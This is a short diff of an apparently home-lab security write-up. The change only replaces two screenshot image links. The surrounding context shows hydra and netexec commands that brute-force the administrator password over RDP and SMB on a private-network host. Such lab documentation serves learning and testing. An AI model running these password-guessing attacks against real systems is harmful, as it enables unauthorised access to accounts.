@@ -64,7 +64,8 @@ Launched a brute force attack against the SMB service targeting the administrato
 hydra -l administrator -P passwords.txt rdp://192.168.1.9 -t 4 -V
 ```
 
-<img width="1279" height="799" alt="image" src="https://github.com/user-attachments/assets/1b196504-c87c-4f4e-bfa1-9e17f1bd5f5b" />
+<img width="1279" height="799" alt="image" src="https://github.com/user-attachments/assets/5a4b331f-d9cc-4ad6-9cf5-988da1592c97" />
+
 
 
 ---
@@ -75,7 +76,8 @@ Used netexec as a more modern and reliable tool against Windows 11 SMB.
 netexec smb 192.168.1.9 -u administrator -p passwords.txt --ignore-pw-decoding
 ```
 
-<img width="1279" height="799" alt="image" src="https://github.com/user-attachments/assets/db0f701a-7b26-4dca-bbd0-234fd523c765" />
+<img width="1279" height="799" alt="image" src="https://github.com/user-attachments/assets/942005c6-cba6-4f8d-ac5b-7629ff21af40" />
+
 
 
 ---
